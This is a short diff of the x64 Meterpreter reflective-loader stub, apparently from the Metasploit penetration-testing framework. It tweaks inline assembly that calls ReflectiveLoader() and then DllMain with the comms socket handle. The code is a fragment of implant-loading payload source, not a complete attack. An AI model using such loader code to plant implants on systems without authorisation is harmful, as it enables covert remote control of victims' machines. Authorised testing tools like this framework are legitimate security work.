@@ -49,15 +49,15 @@ module Payload::Windows::MeterpreterLoader_x64
           ; add the offset to ReflectiveLoader()
           add rbx, #{"0x%.8x" % (opts[:rdi_offset] - 0x11)}
           call rbx              ; invoke ReflectiveLoader()
-        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config)
+        ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
           ; offset from ReflectiveLoader() to the end of the DLL
           add rbx, #{"0x%.8x" % (opts[:length] - opts[:rdi_offset])}
-          mov dword ptr [rbx], edi        ; store the comms socket handle
+          ; store the comms socket handle
+          mov dword ptr [rbx], edi
           mov r8, rbx           ; r8 points to the extension list
-          mov rbx, rax          ; save DllMain for another call
           push 4                ; push up 4, indicate that we have attached
           pop rdx               ; pop 4 into rdx
-          call rbx              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config)
+          call rax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
     ^
   end
 
